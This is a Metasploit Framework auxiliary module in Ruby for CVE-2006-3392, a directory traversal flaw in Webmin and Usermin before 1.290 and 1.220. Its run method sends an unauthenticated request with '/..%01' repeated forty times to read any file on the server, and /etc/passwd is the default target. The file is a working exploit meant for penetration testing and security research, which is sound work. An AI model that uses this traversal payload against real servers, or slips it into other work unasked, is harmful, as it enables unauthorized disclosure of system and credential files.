##
# $Id: file_disclosure.rb 6479 2009-04-13 14:33:26Z kris $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Webmin file disclosure',
			'Description'    => %q{
				A vulnerability has been reported in Webmin and Usermin, which can be
				exploited by malicious people to disclose potentially sensitive information.
				The vulnerability is caused due to an unspecified error within the handling
				of an URL. This can be exploited to read the contents of any files on the
				server via a specially crafted URL, without requiring a valid login.
				The vulnerability has been reported in Webmin (versions prior to 1.290) and
				Usermin (versions prior to 1.220).
			},
			'Author'         => [ 'Matteo Cantoni <goony[at]nothink.org>' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 6479 $',
			'References'     =>
				[
					['OSVDB', '26772'],
					['BID', '18744'],
					['CVE', '2006-3392'],
					['MIL', '2017'],
					['URL', 'http://www.kb.cert.org/vuls/id/999601'],
					['URL', 'http://secunia.com/advisories/20892/'],
				],
			'DisclosureDate' => 'Jun 30 2006',
			'Actions'        =>
				[
					['Download']
				],
			'DefaultAction'  => 'Download'
			))

		register_options(
			[
				Opt::RPORT(10000),
				OptString.new('RPATH',
					[
						true,
						"The file to download",
						"/etc/passwd"
					]
				),
				OptString.new('DIR',
					[
						true,
						"Webmin directory path",
						"/unauthenticated"
					]
				),
			], self.class)
	end

	def run
		print_status("Attempting to retrieve #{datastore['RPATH']}...")

		uri = Rex::Text.uri_encode(datastore['DIR']) + "/..%01" * 40 + Rex::Text.uri_encode(datastore['RPATH'])

		res = send_request_raw({
			'uri'            => uri,
		}, 10)

		if (res)
			print_status("The server returned: #{res.code} #{res.message}")
			print(res.body)
		else
			print_status("No response from the server")
		end
	end

end